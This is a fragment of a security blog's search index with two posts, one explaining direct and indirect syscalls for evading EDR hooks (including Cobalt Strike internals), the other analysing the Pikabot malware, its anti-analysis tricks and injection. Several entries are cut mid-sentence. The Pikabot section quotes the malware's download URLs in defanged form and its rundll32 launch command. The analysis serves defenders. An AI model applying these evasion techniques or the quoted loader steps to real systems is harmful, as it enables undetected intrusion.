Strike Implementation","uri":"/syscalls/"},{"categories":["Reverse Engineering","Research"],"content":"Syscalls? Why? To Bypass user-mood hooks. why? For Hiding a code inside a legitimate process (Process Injection) Avoiding EDR alerts! ","date":"2023-08-18","objectID":"/syscalls/:1:0","tags":["Malware Analysis","Reverse Engineering","Research","Post-exploitation"],"title":"Understanding Syscalls: Direct, Indirect, and Cobalt Strike Implementation","uri":"/syscalls/"},{"categories":["Reverse Engineering","Research"],"content":"User-mood Hooks Hooking user-mode functions by placing a jump to another code section. EDRs use hooks to check the function parameters. For example, if you are trying to change the memory protections of some data to add executable protections. This is a very suspicious activity so EDRs will be alert to that. Most Hooks are on the lowest level of the user-mode interface in ntdll.dll which are the system calls. ","date":"2023-08-18","objectID":"/syscalls/:1:1","tags":["Malware Analysis","Reverse Engineering","Research","Post-exploitation"],"title":"Understanding Syscalls: Direct, Indirect, and Cobalt Strike Implementation","uri":"/syscalls/"},{"categories":["Reverse Engineering","Research"],"content":"Direct syscalls Windows has a defined schema of how syscalls are used. Most of the documented windows APIs are just a wrapper of a lower-level Functions in ntdll.dll which are compiled to a syscall with the right SSN (System Service Number). To look at how Nt* version of the higher-level API is implemented. 0:018\u003e uf NtOpenProcess ntdll!NtOpenProcess: 00007ffa`4874d4c0 4c8bd1 mov r10,rcx 00007ffa`4874d4c3 b826000000 mov eax,26h 00007ffa`4874d4c8 f604250803fe7f01 test byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1 00007ffa`4874d4d0 7503 jne ntdll!NtOpenProcess+0x15 (00007ffa`4874d4d5) Branch ntdll!NtOpenProcess+0x12: 00007ffa`4874d4d2 0f05 syscall 00007ffa`4874d4d4 c3 ret ntdll!NtOpenProcess+0x15: 00007ffa`4874d4d5 cd2e int 2Eh 00007ffa`4874d4d7 c3 ret At address 00007ffa~4874d4d2 there syscall instruction. This instruction transfers the execution to the system-handler at the kernel. The handler is specified using pre-defined SSN number loaded into EAX Register (In this case EAX = 0x26 at address 00007ffa~4874d4c3). So, to make a syscall The SSN associated. The code stub of the syscalls is simple. mov r10, rcx mov eax, \u003csyscall_number\u003e syscall ret Now, the missing thing is the syscall_number. These numbers are changing based on the Build version of windows. There are some techniques to get these numbers. SysWhispers SysWhispers That generate the table of these numbers in the form of a header file and assembly file that can be embedded in the code. The generated code contains syscall number for multiple versions, The right windows build version is detected at runtime using PEB structure. ... +0x118 OSMajorVersion : Uint4B +0x11c OSMinorVersion : Uint4B +0x120 OSBuildNumber : Uint2B ... The assembly code generated (Full document at example-output) ... NtOpenProcess PROC mov rax, gs:[60h] ; Load PEB into RAX. NtOpenProcess_Check_X_X_XXXX: ; Check major version. cmp dword ptr [rax+118h], 5 je NtOpenProcess_SystemCall_5_X_XXXX cmp dword ptr [rax+118h], 6 je NtOpenProcess_Check_6_X_XXXX cmp dword ptr [rax+118h], 10 je NtOpenProcess_Check_10_0_XXXX jmp NtOpenProcess_SystemCall_Unknown NtOpenProcess_Check_6_X_XXXX: ; Check minor version for Windows Vista/7/8. cmp dword ptr [rax+11ch], 0 je NtOpenProcess_Check_6_0_XXXX cmp dword ptr [rax+11ch], 1 je NtOpenProcess_Check_6_1_XXXX cmp dword ptr [rax+11ch], 2 je NtOpenProcess_SystemCall_6_2_XXXX cmp dword ptr [rax+11ch], 2 je NtOpenProcess_SystemCall_6_3_XXXX jmp NtOpenProcess_SystemCall_Unknown NtOpenProcess_Check_6_0_XXXX: ; Check build number for Windows Vista. cmp dword ptr [rax+120h], 6000 je NtOpenProcess_SystemCall_6_0_6000 cmp dword ptr [rax+120h], 6001 je NtOpenProcess_SystemCall_6_0_6001 cmp dword ptr [rax+120h], 6002 je NtOpenProcess_SystemCall_6_0_6002 jmp NtOpenProcess_SystemCall_Unknown NtOpenProcess_Check_6_1_XXXX: ; Check build number for Windows 7. cmp dword ptr [rax+120h], 7600 je NtOpenProcess_SystemCall_6_1_7600 cmp dword ptr [rax+120h], 7601 je NtOpenProcess_SystemCall_6_1_7601 jmp NtOpenProcess_SystemCall_Unknown NtOpenProcess_Check_10_0_XXXX: ; Check build number for Windows 10. cmp dword ptr [rax+120h], 10240 je NtOpenProcess_SystemCall_10_0_10240 cmp dword ptr [rax+120h], 10586 je NtOpenProcess_SystemCall_10_0_10586 ... SSN code stub This technique doesn’t Look for SSN number, instead it gets the code stub of the required API. This can be done by opening the PE file and parsing the Export table of ntdll Extract SSN It Extract the SSN from ntdll by parsing the Export table. The difference between it and the previous one is that it only extracts the syscall number. Both methods load ntdll.dll from the disk first using win32 API OpenFile which might be hooked. hell’s gate for more. Syscalls’ number sequence This method take advantage of the SSNs are in a sequence for example if a syscall number is 0x26 the following will be 0x27 and so on. This relies also on the fact that not all the system calls are hooked! So, to get the SSN of a function, you need to find th","date":"2023-08-18","objectID":"/syscalls/:2:0","tags":["Malware Analysis","Reverse Engineering","Research","Post-exploitation"],"title":"Understanding Syscalls: Direct, Indirect, and Cobalt Strike Implementation","uri":"/syscalls/"},{"categories":["Reverse Engineering","Research"],"content":"Indirect syscalls All the methods described are workarounds to get the system call number without getting caught. syscall instruction reveals that some suspicious activity is going on. This is done using KPROCESS!InstrumentationCallback in windows. 0:030\u003e dt _kprocess ntdll!_KPROCESS +0x000 Header : _DISPATCHER_HEADER ... +0x3d8 InstrumentationCallback : Ptr64 Void ... +0x3f8 EndPadding : [8] Uint8B Any time the windows is done with a syscall and returns to user-mode, it checks this member it is not NULL, the execution will be transferred to that pointer. To check if the syscall is legit, the return address after finishing the syscall is checked to see if it is not from a valid place. If the address is in the address space of the process running, it’s not a legitimate place to make a syscall. This check was done by ScyllaHide to detect manual syscalls, the source code can be found here. if (InterlockedOr(TlsGetInstrumentationCallbackDisabled(), 0x1) == 0x1) return ReturnVal; // Do not recurse const PVOID ImageBase = NtCurrentPeb()-\u003eImageBaseAddress; const PIMAGE_NT_HEADERS NtHeaders = RtlImageNtHeader(ImageBase); if (NtHeaders != nullptr \u0026\u0026 ReturnAddress \u003e= (ULONG_PTR)ImageBase \u0026\u0026 ReturnAddress \u003c (ULONG_PTR)ImageBase + NtHeaders-\u003eOptionalHeader.SizeOfImage) { // Syscall return address within the exe file ReturnVal = (ULONG_PTR)(ULONG)STATUS_PORT_NOT_SET; // Uninstall ourselves after we have completed the sequence { NtQIP, NtQIP }. More NtSITs will follow but we can't do anything about them NumManualSyscalls++; if (NumManualSyscalls \u003e= 2) { InstallInstrumentationCallbackHook(NtCurrentProcess, TRUE); } } InterlockedAnd(TlsGetInstrumentationCallbackDisabled(), 0); return ReturnVal; } It checks the return address of the successful system call. If it resides on the address space of the binary we are running, it is an indication of manual system call. The Solution The solution to this hooking method is done by Bouncy Gate and Recycled Gate method. The idea is quite simple, it is an adjusted version of Hell’s Gate. Instead of directly executing syscall instruction and getting caught by static signatures and system call callbacks described above, the author replaces the syscall instruction with a trampoline jump (JMP) to a syscall instruction address from ntdll.dll. now there is no direct syscall instruction and the system call originated from a legitimate place ntdll. This is also implemented in SysWhispers3. To get the address of the syscall instruction in ntdll we can parse the export table and search for syscall, ret opcodes 0F 05 0C or the constant pattern of syscalls in ntdll can be used to get the syscall address. If the function is not hooked, the syscall instruction is on offset 0x12 from the function’s address, we can verify that by comparing the opcodes. ","date":"2023-08-18","objectID":"/syscalls/:3:0","tags":["Malware Analysis","Reverse Engineering","Research","Post-exploitation"],"title":"Understanding Syscalls: Direct, Indirect, and Cobalt Strike Implementation","uri":"/syscalls/"},{"categories":["Reverse Engineering","Research"],"content":"Indirect syscalls in Cobalt Strike The sample from Dodo’s blog Where he already analyzed how indirect syscalls implemented in Cobalt Strike. for easy access, here is UnpacMe Results 020b20098f808301cad6025fe7e2f93fa9f3d0cc5d3d0190f27cf0cd374bcf04. The sample is packed. The unpacking process is easy. Just put a breakpoint on VirtualProtect and get the base address (First Argument). Function sub_18001B6B0 contains the important part, system call SSN retrieving and execution methods. You can get to this function by following the call instruction to rax which contains a qword memory area or a call to the qword directly. These locations are populated with addresses of the required APIs in this function. We can see multiple calls to sub_18001A73C with arguments: qword_*, a hash (such as 0B12B7A69h), variable passed to the function sub_18001A7F4 and another allocated memory which is also passed to sub_18001A7F4. Function sub_18001A73C is to resolve the function address (syscall stub address) by the hash. And function sub_18001A7F4 used to populate the list with the system call SSN and system call stub. So, sub_18001A7F4 is our target. In the following picture is the beginning of the function. The function starts with getting a pointer to the first entry in InLoadOrderModuleList structure by going through reading the Process Environment Block (PEB). here in the picture, r10 is holding the current entry of the structure and r9 is like a variable to get each entry, this is the breaking condition of the loop as the _LIST_ENTRY structure wrap around itself (doubly linked list). The next step is to get the Export directory of ntdll.dll but first, get ntdll address in memory. It is looking for the right module in the InLoadOrderModuleList by going through each entry, the flink is a pointer to LDR_DATA_TABLE_ENTRY where we can get a pointer to the module. By parsing the module (going through PE file headers) to get the name of the DLL which resides in the Export directory (First member) which is the first member of IMAGE_DATA_DIRECTORY structure. It is then tested to see if it is the target module (ntdll). If the module is ntdll, it saves a pointer to AddressOfFunctions, AddressOfNames and AddressOfNameOrdinals. A memory region of size 0x1f40 is then zeroed as it will hold the structures of the system call information needed. The next part is checking the function prefix Ki and Zw. It looks for only one function prefixed by Ki with the hash 8DCD4499h, but I couldn’t find function with this hash (using debugger). Then, a call to a hashing function is made. The hashing function is simple. It uses 0x52964EE9 as an initial key value to start the process then: Get 2-bytes of the Function name (little endian). Rotate the key by 8 (2 characters). Add the key and the 2-bytes of the name. Increment the counter by 1 (Resulting that all the chars in between the start and end taken two times in the calculation for example ZwOpenProcess will take Wz in the first iteration and Ow in the second and so on). The result of the addition is XORed with the key to produce the new key. The hash value returned is the last result of the XOR operation. The resulting value is stored in the following form, in the pre-allocated space. The first DWORD is the hash. The second DWORD is the Relative Virtual Address (RVA) of the system call0. The third QWORD is the Virtual Address (VA) of the system call stub (RVA + ntdll Base Address). So, it can be written as: struct syscall_info { DWORD API_hash; DWORD syscall_stub_RVA; QWORD syscall_stub_address; }; After populating the structure with the addresses. The structure elements are being sorted by the RVA of the system call stub (second entry in the structure). After the sorting algorithm is done, the memory structure look like the following: The first address is the address to the Lowest address ZwMapUserPhysicalPagesScatter (Could be different at newer versions of windows) at address 00000000774E1340 If we see the system cal","date":"2023-08-18","objectID":"/syscalls/:4:0","tags":["Malware Analysis","Reverse Engineering","Research","Post-exploitation"],"title":"Understanding Syscalls: Direct, Indirect, and Cobalt Strike Implementation","uri":"/syscalls/"},{"categories":["Reverse Engineering","Research"],"content":"Detecting syscalls System calls can be used to bypass user mood hooks but there are other methods to detect Direct and Indirect syscalls. To detect Direct system calls, Windows provides a large set of callback functions, one of them is KPROCESS!InstrumentationCallback . This callback is triggered whenever the system returns from the kernel mode to user mode. This could be used to check the return address of the syscall which reveals the location of syscall instruction execution. This location should be ntdll but in case of the direct system calls, it will be from the .text section of the PE file. This was used by ScyllaHide. Indirect system calls solved this problem by getting the address of syscall instruction in ntdll and jump to it. To detect indirect syscalls the call stack tracing method can be used to check from where the system call originated -before jumping to ntdll-. This also can be bypassed by creating a new thread to get a new call stack using callback functions like TpAllocWork and RtlQueueWorkItem. If you want to know more about this, you can read Hiding In PlainSight 1\u00262 Note: This was personal notes I wrote when I was learning about syscalls, if there’s anything not accurate, please let me know ","date":"2023-08-18","objectID":"/syscalls/:5:0","tags":["Malware Analysis","Reverse Engineering","Research","Post-exploitation"],"title":"Understanding Syscalls: Direct, Indirect, and Cobalt Strike Implementation","uri":"/syscalls/"},{"categories":["Reverse Engineering","Research"],"content":"References https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/ https://www.youtube.com/watch?v=elA_eiqWefw\u0026t=3176s https://offensivedefence.co.uk/posts/dinvoke-syscalls/ https://www.felixcloutier.com/x86/syscall.html https://www.mdsec.co.uk/2022/04/resolving-system-service-numbers-using-the-exception-directory/ https://github.com/j00ru/windows-syscalls/ https://cocomelonc.github.io/malware/2023/06/07/syscalls-1.html https://www.crummie5.club/freshycalls/ https://github.com/x64dbg/ScyllaHide/blob/master/HookLibrary/HookedFunctions.cpp https://eversinc33.com/posts/avoiding-direct-syscall-instructions/ https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low https://github.com/dodo-sec/Malware-Analysis/blob/main/Cobalt Strike/Indirect Syscalls.md https://github.com/crummie5/FreshyCalls/blob/112bdf0db63a5f7104ba5243af6a672bc098a1ad/syscall.cpp#L65 https://0xdarkvortex.dev/hiding-in-plainsight/ https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/ ","date":"2023-08-18","objectID":"/syscalls/:6:0","tags":["Malware Analysis","Reverse Engineering","Research","Post-exploitation"],"title":"Understanding Syscalls: Direct, Indirect, and Cobalt Strike Implementation","uri":"/syscalls/"},{"categories":["Malware Analysis"],"content":"Pikabot loader and core deep analysis","date":"2023-07-31","objectID":"/pikabot/","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"Introduction Pikabot is a new malware first seen in early 2023. It has two components: Loader and core module. It is still in its initial stages, expected to see increasing activity in the future. Some researchers believe that it is linked to TA570 because of the similarity of delivering method between it and Qbot trojan. And the absence of Qbot activity in the period of pikabot activity. The Loader usage is to perform a lot of Anti-debug, Anti-VM and Anti-emulation checks to make it harder for automated analysis and inject the core module. The strings are obfuscated using the stack and simple Bitwise operation. The constant integers are obfuscated using structures and loops to get the right offset. The core module has a lot of functionality that gives the attacker full control of the victim machine. ","date":"2023-07-31","objectID":"/pikabot/:1:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"Analysis ","date":"2023-07-31","objectID":"/pikabot/:2:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"First stage: JS \u0026 PowerShell The infection starts with a malicious email containing a link that downloads a JS file that used to download Pikabot DLL. The sample discussed here can be found on malware-traffic-analysis . The threat actor tried to make the script look legit by embedding some comments related to MIT License of some opensource projects, zlib , pako and react-redux. Also, the names he used are not randomized and begin with MIT. The script contains 1,759 lines of code. So, instead of wasting time trying to figure out what is going on, I debugged the script using the browser. Not too much appears but the string PowerShell is used. so, we can make use of PowerShell logging feature to catch the script for us. I Enabled PowerShell Logging and Transcript logging that get the full PowerShell session with the output. Let the sample runs and check the logs: Checking the transcript log file created to see the full session. The first script is the RAW data the retrieved from the JS file and the second one is the decoded one. Let’s look at the script. pastebin The first 6 Variables (numbered lines) weren’t used anywhere in the code. They contain some invalid URLs and IPs. The list can be found in the following table. Note: Every variable contains not only one base64 encoded string but multiple, separated by a character. e.g., $rifflers uses q character as a separator and $gentlewomanlike that contains valid IP list uses XO as a separator. Just delete the separator and decode the string will work. URL Status http[://]Supermysteries[.]creditcard Not found https[://]205.194.71[.]236 Not found https[://]punishes[.]vacations Not found https[://]profiters[.]construction Not found https[://]83.99.144[.]199 Not found http[://]whittret[.]hamburg Not found https[://]AdelochordaIntroverse[.]pizza Not found https[://]98.81.136[.]149 Not found https[://]UnredeemedlyBeadeyes[.]land Not found http[://]81.179.42[.]197 Not found http[://]Leavings[.]florist Not found http[://]55.112.208[.]170 Not found http[://]wilded[.]parts Not found https[://]AlbergatriceRepaginated[.]xxx Not found http[://]heptameron[.]se Not found http[://]51.238.155[.]130 Not found https[://]Bigeminy[.]tokyo Not found https[://]144.206.78[.]90 Not found https[://]zeatin[.]marketing Not found http[://]countervene[.]agency Not found Going back to the script, it iterates through the variable $gentlewomanlike using XO as a separator between each Base64-encoded string. There are more unused URLs in the script. But the used strings that initiate a request t them are: http[://]126.228.74[.]105/bm/IMgP http[://]74.147.74[.]110/oc1Cs/lhdGK http[://]227.191.163[.]233/eHDP/WLmO http[://]151.236.14[.]179/DekOPg/Kmn40 http[://]192.121.17[.]92/JTi/IK2I8szLO http[://]192.121.17[.]68/9Cm9EW/BVteE After Downloading the DLL, rundll32 to run It. start rundll32 $env:ProgramData\\\\forerankSomnolescent.EuthanasyUnblushingly,vips;MITLicense ","date":"2023-07-31","objectID":"/pikabot/:2:1","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"Second stage: Pikabot Loader To get the final payload, I used unpacme. for the unpacked sample, see unpacme result NOTE: The unpacked DLL is broken so, if you want to debug the sample you can use this sample At the end of DllEntryPoint There is a call to the main function of the malware that contains all its functionality. All functions will have the same structure. First there is some code to obfuscate the numbers used later, then decoding the required strings and in the end, it will resolve the required functions and calls it. One of the first things the malware does is to resolve the required APIs. Pikabot resolves two functions that will be used to get the addresses of the required APIs; GetProcAddress and LoadLibraryA by searching through Kernel32.dll exports using a Hash of each API; 0x57889AF9 and 0x0B1C126D, respectively. ","date":"2023-07-31","objectID":"/pikabot/:2:2","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"String decryption The malware uses stack strings followed by a single bitwise operation. The operation and the key are different throughout the strings so, the best option is to emulate this part to get the decoded strings. The decoding operation takes a constant pattern as follows. Construct the stack strings. loop all over the string to execute the decoding operation. move the string to its location. check ecx counter register against hardcoded string length. I will use Qiling in the emulation. First let’s try with a single string. NOTE: The script did not run with me if the DLL is not located in a sub path of rootfs. For more information about the installation process look at the documentation or this blog. from qiling import * from qiling.const import QL_VERBOSE argv = [r\"qiling\\\\examples\\\\rootfs\\\\x86_windows\\\\Windows\\\\bin\\\\pika.dll\"] rootfs = r\"qiling\\\\examples\\\\rootfs\\\\x86_windows\" ql = Qiling(argv=argv, rootfs=rootfs, verbose=QL_VERBOSE.OFF) ql.emu_start(begin=0x10005542, end=0x10005588) print(ql.mem.read(ql.arch.regs.ebp - 0x40 ,ql.arch.regs.ecx+1)) ql.emu_stop() The first stack string is AddVectoredExceptionHandler. Now we want to make go decode all the strings of the binary. The method I will use here based on OALABS Blog How to locate where stack strings are decoded? Every Block of stack strings ends with cmp REG, \u003cSTRING_LENGTH\u003e followed by a jl. So, if we locate this pattern, we can backtrack to find a sequence of mov instruction. How to do this? Locate every basic block end with jl and cmp REG,\u003cconstant\u003e Record the address of jl + 0x4 as the emulation stop address. backtrack to find the string offset. The first mov instruction starting from the end (jl) Record the stack offset (first argument) Find the first mov instruction as the emulation address. I tried to emulate it with qiling but it has some problems: Not using ebp register in all the references. Too slow as qiling will load in every string decoding. (If loaded once, most of the strings will not be decoded as the address will be pointing to unmapped region of memory) Qiling script will be helpful if you want to get a specific string. I wrote this script to manually decode the strings. can be found on my github import ctypes import idc import idaapi import idautils def get_operand_offset(ea): op_offset = idc.get_operand_value(ea, 0) return ctypes.c_int(op_offset).value def get_second_operand(ea): op_offset = idc.get_operand_value(ea, 1) return ctypes.c_uint(op_offset).value def get_second_operand_short(ea): op_offset = idc.get_operand_value(ea, 1) return ctypes.c_ushort(op_offset).value def get_bitwise_op(ea, block_start_ea): while ( idc.print_insn_mnem(ea) != \"xor\" and idc.print_insn_mnem(ea) != \"add\" and idc.print_insn_mnem(ea) != \"and\" and idc.print_insn_mnem(ea) != \"sub\" ) and ea \u003e block_start_ea: ea = idc.prev_head(ea) return ea def bitwise_and_bytes(a, b): result_int = int.from_bytes(a, byteorder=\"little\") \u0026 int.from_bytes(b, byteorder=\"little\") result_int = result_int \u0026 0x00FF return result_int.to_bytes(1, byteorder=\"little\") def bitwise_sub_bytes(a, b): result_int = int.from_bytes(a, byteorder=\"little\") - int.from_bytes(b, byteorder=\"little\") result_int = result_int \u0026 0x00FF # print(result_int) return result_int.to_bytes(1, byteorder=\"little\") def bitwise_add_bytes(a, b): result_int = int.from_bytes(a, byteorder=\"little\") + int.from_bytes(b, byteorder=\"little\") result_int = result_int \u0026 0x00FF return result_int.to_bytes(1, byteorder=\"little\") def bitwise_xor_bytes(a, b): result_int = int.from_bytes(a, byteorder=\"little\") ^ int.from_bytes(b, byteorder=\"little\") result_int = result_int \u0026 0x00FF return result_int.to_bytes(1, byteorder=\"little\") def set_comment(address, text): idc.set_cmt(address, text, 0) def is_valid_cmp(ea): if idc.print_insn_mnem(ea) == \"cmp\": if idc.get_operand_type(ea, 0) == 1 and idc.get_operand_type(ea, 1) == 5: return True return False def parse_fn(fn): out = [] func = ida_funcs.get_func(fn) # get function pointer func_fc = lis","date":"2023-07-31","objectID":"/pikabot/:2:3","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"Dynamic API resolving the malware uses LoadLibraryA and GetProcAddress to get the function Address. They choses the appropriate DLL by passing a flag in the first Argument. flag DLL 1 Kernel32.dll 2 User32.dll 3 ntdll.dll ","date":"2023-07-31","objectID":"/pikabot/:2:4","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"Anti Analysis The malware uses a series of anti-debugging checks before continuing, the checks used: Test Exception EXCEPTION_BREAKPOINT (0x80000003) using the resolved AddVectoredExceptionHandler followed by a function to trigger the EXCEPTION_BREAKPOINT exception using INT 0x2D. Then it removes the handler using RemoveVectoredExceptionHandler. In a subsequent call, it uses int 3 instead of int 0x2D. check BeingDebugged flag. Win32 API CheckRemoteDebuggerPresent and IsDebuggerPresent delay the execution using beep function to escape Sandbox environments. Anti-VM trick is that it imports different Libraries that don’t exist in most of the VMs and Sandboxes. Libraries are: NlsData0000.DLL , NetProjW.DLL , Ghofr.LL and fg122.DLL. Checks NtGlobalFlag as it is equal zero by default but set to 0x70 if a debugger is attached. Calls NtQueryInformationProcess with ProcessDebugPort (0x7) Flag. Function sub_10002315 has a couple of Anti debugging \u0026 Anti Emulation checks. The first it Uses GetWriteWatch and VirtualAlloc APIs To test for a Debugger attached or Sandbox environment by making a call to VirtualAlloc with MEM_WRITE_WATCH Flag specified, then call GetWriteWatch to retrieve the addresses of the allocated pages that has been written to since the allocation or the write-track state has been reset. PoC. The second check is a series of function calls that are responsible for checking if the malware runs in sandbox or emulation environment. its return values will determine if the system is running normal or something is happening (Sandbox or emulation). It starts by checking the atom name using GlobalGetAtomNameW passing invalid nAtom = 0 parameter and checking the return value (Should be 0). The next is to call GetEnvirnmentVariableA with lpName = %random_file_name_that_doesnt_exist?[]\u003c\u003e@\\\\;*!-{}#:/~% expecting it to return 0 as it is likely to have an environment variable name like that. Then, it calls GetBinaryTypeA with lpApplicationName = %random_file_name_that_doesnt_exist?[]\u003c\u003e@\\\\;*!-{}#:/~% expecting it to return 0 as well. Then it calls HeapQueryInformation with invalid HEAP_INFORMATION_CLASS value (69). Same thing with ReadProcessMemory API passing invalid address 0x69696969. Then, it is called GetThreadContext passing reused allocated memory and not a pointer to Context structure. Uses SetLastError and GetLastError with OutputDebugStringA(“anti-debugging test.”) to check if the debugger attached, the debug message will be printed successfully and. If the debugger is not attached, the error code will be changed indicating that no debugger is attached. Check the number of processors using GetSystemInfo. Less than 2 return 0 indicating VM environment. Uses __rdtsc twice to detect single stepping in the debuggers. the same thing with QueryerformanceCounter and GetTickCount64. Check the memory size with GlobalMemoryStatusEx to check if it is less than 2 GB. Check the Trap flag (T) as indicator if single stepping. ","date":"2023-07-31","objectID":"/pikabot/:2:5","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"Unpacking Core module After doing Anti-Analysis checks, the Loader extracts the core module from the resource section. The core module is scattered through multiple PNG files in RCData -In this sample- Resource. It checks for 4 Bytes string in the resource, It’s the beginning of the encrypted blob of the core component. In the sample we are discussing are ttyf and oEom After getting the offset of the beginning of the encrypted data. It decrypts a 20-byte string to use it as an XOR key to perform the first stage of the decryption. To get the key, the function needs to be emulated from the beginning as it makes some calculations to decode the twenty bytes -scattered through multiple variables- then, gather them into one variable. from qiling import * from qiling.const import QL_VERBOSE argv = [r\"qiling\\\\examples\\\\rootfs\\\\x86_windows\\\\Windows\\\\bin\\\\pika.dll\"] rootfs = r\"qiling\\\\examples\\\\rootfs\\\\x86_windows\" ql = Qiling(argv=argv, rootfs=rootfs, verbose=QL_VERBOSE.OFF) ql.emu_start(begin=0x10011A5E, end=0x100121DF) print(ql.mem.read(ql.arch.regs.ebp - 0x4c ,0x14)) ql.emu_stop() The output The core module is stored in two PNG images in the resource section. After The XOR operation is done, The XORed data is then decrypted using AES (CBC) Algorithm using a 32-byte key and the first 16-byte of the key used as an initialization vector. In this sample the Key is decrypted at the address 0x100114B0, after emulating this section, we got the key q10u9EYBtqXC1XUhmGmI7XUitdOpydzB. After Decrypting the Core module, it is injected in C:\\\\Windows\\\\SysWOW64\\\\SndVol.exe process. Note: the target process varies across the samples. I looked at another one and it was C:\\Windows\\System32\\WWAHost.exe To get the core module, you can put a breakpoint on WriteProcessMemory and dump the memory buffer containing the injected code. In my case I had to change the name of the target process as the original target process does not exist on my machine. The whole binary is not written in one time so be patient OR write down the address of the injected code in the target process and put a breakpoint on ResumeThread and dump the address, it will be mapped to you will need to unmap it first. OR you can just dump the heap buffer that contains the decrypted data and dump the memory section, but it will need to be cleaned. ","date":"2023-07-31","objectID":"/pikabot/:2:6","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"Third stage: Pikabot Core module I uploaded the unpacked sample to [malware bazaar] (MalwareBazaar | SHA256 11cbb0233aff83d54e0d9189d3a08d02a6bbb0ffa5c3b161df462780e0ee2d2d (abuse.ch)) The core module uses the same string encryption method so applying the previous script works well. The DLL contains a small number of functions and exports. DllRegisterServer contains a call to sub_100025FF function that has all the functionality of the Core module. The same API dynamic resolving function (sub_100036BA) is used but more DLLs are added to use network and other functionalities required. The Additional DLLs are: Wininet.dll, Advapi32.dll and NetApi32.dll ","date":"2023-07-31","objectID":"/pikabot/:2:7","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"System language check The first thing the malware does is to check the language code of the victim machine. If the Region is one of the following lists, the malware will exit without any further activity. Georgia Kazakhstan Tajikistan Russia Ukraine Belarus ","date":"2023-07-31","objectID":"/pikabot/:2:8","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"Anti Analysis Then, it performs some basic anti debugging checks (sub_10001994). BeingDebugged flag. NtGlobalFlag ANDed with 0x70 to check if a debugger is attached. rdtsc instruction. check the delay between two calls. Trap flag (T) of the EFLAGS register (T flag is the eighth bit) And it uses two Anti VM checks (sub_10001AA6): It executes cpuid instruction with EAX = 0x40000000 to return Hypervisor brand and compare the returned value in the ECX == 0x4D566572 and EDX == 0x65726177 which are VMware CPUID value (for more explanation and how to defeat it, check this blog). Check the existence of Virtual Box related registry key HARDWARE\\\\\\\\ACPI\\\\\\\\DSDT\\\\\\\\VBOX__ The malware then checks the command execution functionality using a command that vary across the samples. cmd.exe /C \"ping localhost \u0026\u0026 copy /b /y %s\\\\%s %s\\\\%s\" passing this wide string to wsprintfW function with only one string %SystemRoot% -This could lead to unexpected behavior; it could raise access violation exception or just continue and only the first placeholder replaced. - The output is then executed using CreateProcessW and the return value is checked to determine the function’s return value, if it is 0, return 0 if not, it will call CloseHandle() twice: The first with a valid handle to close the process created. the second with invalid handle = 0, will return 0 -or should be 0 in normal systems, this could be anti-sandbox/emulation not sure as the function’s return value is not used-. ","date":"2023-07-31","objectID":"/pikabot/:2:9","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"Hardcoded Mutex! It uses a hardcoded mutex value {99C10657-633C-4165-9D0A-082238CB9FE0} to make sure that the victim is not infected twice by calling CreateMutexW followed by a call to GetLastError to check the last error code. ","date":"2023-07-31","objectID":"/pikabot/:2:10","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"Collect victim info. The next step is to collect some information about the victim system to send them to the C2 server (sub_10008263). The first thing you will see at the beginning of this function is a big stack string. This string is the schema that will be filled with the victim info, decoding this string will give us the following. The stream = bb_d2@T@dd48940b389148069ffc1db3f2f38c0e and version = 0.1.7 are predefined in the binary. The information collection process is done as follows (sub_1000241E): Get the os_version from OSMajorVersion , OSMinorVersion and OSBuildNumber from the PEB structure and GetProductInfo API. Get the victim’s username by calling GetUserNameW API. Get the pc_name by calling GetComputerName API. Get the cpu_name by executing cpuid instruction with initial value EAX = 0x80000000. Get the gpu_name by calling EnumDisplayDevicesW API. Get the ram_amount by calling GlobalMemoryStatusEx API. Get the pc_uptime by calling GetTickCount API. Get the screen_resolution by calling GetWindowRect and GetDesktopWindow APIs. Get the arch by calling GetSystemInfo API. Get the domain_name by calling GetComputerNameExW API. Get domain_controller_name by calling DsGetDcNameW API or return unknown if not available. Each data item fills its location by calling wsprintfW function so, it will become like the following but with the victim collected data. \"{\"uuid\": \"uuid\", \"stream\": \"bb_d2@T@dd48940b389148069ffc1db3f2f38c0e\", \"os_version\": \"OS version and build number\", \"product_number\": , \"username\": \" victim username\", \"pc_name\": \"computer name\", \"cpu_name\": \"cpu name\", \"arch\": \"system architecture\", \"pc_uptime\": , \"gpu_name\": \"gpu name\", \"ram_amount\": \"ram amount\", \"screen_resolution\": \"screen resolution\", \"version\": \"0.1.7\", \"av_software\": \"unknown\", \"domain_name\": \"\", \"domain_controller_name\": \"unknown\", \"domain_controller_address\": \"unknown\"}\" ","date":"2023-07-31","objectID":"/pikabot/:2:11","tags":["Malware Analysis","Reverse 